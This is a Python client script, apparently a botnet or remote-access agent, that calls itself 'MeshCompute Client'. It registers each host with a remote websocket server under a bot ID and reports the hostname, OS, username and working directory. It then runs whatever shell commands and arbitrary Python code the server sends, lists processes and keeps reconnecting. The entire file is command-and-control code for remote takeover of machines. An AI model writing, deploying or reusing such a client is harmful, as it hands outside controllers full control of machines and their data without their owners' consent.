import asyncio
import websockets
import json
import uuid
import platform
import psutil
import time
import logging
import subprocess
import shlex
import os
from dotenv import load_dotenv
from common.config import SERVER_URL, AUTH_TOKEN, MAX_COMMAND_TIMEOUT

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot_id = f"{str(uuid.uuid4())[:8]}-{platform.node()[:8]}"

async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "python": platform.python_version(),
        "cpu": psutil.cpu_count(logical=False),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "username": os.getenv("USER") or os.getenv("USERNAME"),
        "cwd": os.getcwd(),
        "bot_id": bot_id,
        "pid": os.getpid()
    }

async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
    try:
        args = shlex.split(cmd)
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE, timeout=timeout
        )
        stdout, stderr = await proc.communicate()
        return {
            "success": proc.returncode == 0,
            "output": stdout.decode('utf-8', errors='replace'),
            "error": stderr.decode('utf-8', errors='replace'),
            "returncode": proc.returncode
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

async def main():
    while True:
        try:
            async with websockets.connect(SERVER_URL) as ws:
                await ws.send(json.dumps({
                    "type": "register",
                    "auth_token": AUTH_TOKEN,
                    "bot_id": bot_id,
                    "info": await get_system_info()
                }))

                async for message in ws:
                    data = json.loads(message)

                    if data["type"] == "command":
                        action = data["data"]["type"]
                        payload = data["data"].get("payload")
                        task_id = data.get("task_id")

                        result = {"type": "result", "task_id": task_id, "bot_id": bot_id}

                        if action == "exec":
                            res = await execute_command(payload)
                            result.update(res)
                            result["command"] = payload

                        elif action == "sysinfo":
                            result.update({
                                "success": True,
                                "info": await get_system_info()
                            })

                        elif action == "python":
                            try:
                                exec_globals = {}
                                exec(payload, exec_globals)
                                output = exec_globals.get("output", "Code executed (no output variable)")
                                result.update({"success": True, "output": str(output)})
                            except Exception as e:
                                result.update({"success": False, "error": str(e)})

                        elif action == "ps":
                            processes = [{"pid": p.info['pid'], "name": p.info['name'], "cpu": p.info['cpu_percent']}
                                       for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
                            result.update({"success": True, "processes": processes[:50]})  # Limit

                        await ws.send(json.dumps(result))

        except Exception as e:
            logger.error(f"Verbindung unterbrochen: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    print(f"MeshCompute Client gestartet → {bot_id}")
    asyncio.run(main())